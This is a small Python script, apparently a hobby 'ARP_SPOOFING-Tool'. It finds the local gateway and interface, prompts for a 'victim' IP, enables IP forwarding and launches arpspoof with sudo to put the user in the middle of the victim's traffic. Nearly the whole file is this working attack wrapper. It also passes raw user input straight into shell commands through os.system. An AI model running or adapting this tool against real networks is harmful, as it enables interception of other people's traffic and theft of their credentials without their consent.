import sm
import os


sm.clear()
print("Start ARP_SPOOFING-Tool..")
sm.sleep()
sm.clear()

print("Analysing and discover network...")
os.system("python3 IP.py > ip.txt")
os.system("python3 IP.py")
sm.sleep()

# Get Ip and Interface
read_txt = open("ip.txt", "r")  # Opens txt-document contains ip and interface.
read2_txt = read_txt.read()
read2_txt = read2_txt.split()
ip_discover = read2_txt[2:3]
ip = ""
for ip_word in ip_discover:  # Converts ip to string
    ip += ip_word
interface_discover = read2_txt[4:5]
interf = ""
for inter_word in interface_discover:  # Converts interface to string
    interf += inter_word
read_txt.close()        # Closes txt-document contains ip and interface.

sm.clear()

ip_victim = input("Ip from your victim: ")
sm.clear()
print("Start arpspoof...")
sm.sleep()
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")   # Enables the ip forwarding
os.system("sudo arpspoof -i " + interf + " -t " + ip_victim + " -r " + ip)   # Start arpspoof
os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")   # Disables the ip forwarding

read_txt = open("ip.txt", "w")     # Clears the txt-document
read_txt.close()
